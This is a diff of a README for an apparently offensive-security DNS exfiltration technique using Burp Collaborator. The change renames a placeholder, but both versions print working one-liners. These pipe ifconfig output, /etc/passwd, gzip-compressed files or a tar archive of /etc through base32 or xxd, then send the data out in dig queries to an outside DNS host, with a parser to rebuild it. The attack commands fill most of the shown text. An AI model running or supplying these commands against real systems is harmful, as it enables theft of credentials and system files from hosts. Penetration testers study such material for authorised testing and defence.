@@ -18,7 +18,7 @@ Thanks and credit to [Xavier Mertens](https://www.sans.org/profiles/xavier-merte
 
 Note that if results are unreliable you can specify the name or IP of the DNS server via `dig @`...
 
-In the examples below: `<DNS Name>` is the random name provided by Burp Collaborator (AKA, the interaction ID). For example: use `q3uv485lz802ad6a7xz6c2izvq1hp6` if your Beef Collaborator address is `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`. Use a different query ID for each transfer.
+In the examples below: `<Name>` is the random name provided by Burp Collaborator (AKA, the interaction ID). For example: use `q3uv485lz802ad6a7xz6c2izvq1hp6` if your Beef Collaborator address is `q3uv485lz802ad6a7xz6c2izvq1hp6.oastify.com`. Use a different query ID for each transfer.
 
 For `base32`, the `-w63` flag specifies line wrapping at 63 bytes. For `xxd` (hex): the `-p` flag is 'output  in  postscript  continuous  hexdump style', and `-c31` is count of 31 hex characters (62 bytes sent).
 
@@ -26,51 +26,51 @@ For `base32`, the `-w63` flag specifies line wrapping at 63 bytes. For `xxd` (he
 
 #### base32
 ```
-ifconfig | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+ifconfig | base32 -w63 | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### hex
 ```
-ifconfig | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+ifconfig | xxd -p -c31 | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### Decode the output
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log)
+dns-parse.py <Name> (query.log|collaborator.log)
 ```
 
 ### Exfiltrate a file
 
 #### base32
 ```
-base32 -w63 < /etc/passwd | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+base32 -w63 < /etc/passwd | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### hex
 ```
-xxd -p -c31 < /etc/passwd | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+xxd -p -c31 < /etc/passwd | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### Decode the file
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log)
+dns-parse.py <Name> (query.log|collaborator.log)
 ```
 
 ### Exfiltrate a compressed file:
 
 #### base32
 ```
-gzip - < /etc/passwd | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+gzip - < /etc/passwd | base32 -w63 | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### hex
 ```
-gzip - < /etc/passwd | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+gzip - < /etc/passwd | xxd -p -c31 | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### Decode/unzip the file
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log) | zcat
+dns-parse.py <Name> (query.log|collaborator.log) | zcat
 ```
 
 ### Exfiltrate a compressed tar archive of a directory:
@@ -79,17 +79,17 @@ Note that exfiltrating /etc on an Ubuntu Linux system worked (but was slow). It 
 
 #### base32
 ```
-tar czf - /etc | base32 -w63 | tr -d = | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+tar czf - /etc | base32 -w63 | tr -d = | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### hex
 ```
-tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<DNS Name>.<DNS Server>; done;
+tar czf - /etc | xxd -p -c31 | while read a; do dig $a.<Name>.<DNS Server>; done;
 ```
 
 #### Decode/save the tar archive
 ```
-dns-parse.py <DNS Name> (query.log|collaborator.log) > exfiltrated.tgz
+dns-parse.py <Name> (query.log|collaborator.log) > exfiltrated.tgz
 ```
 
 ## Sample Logs
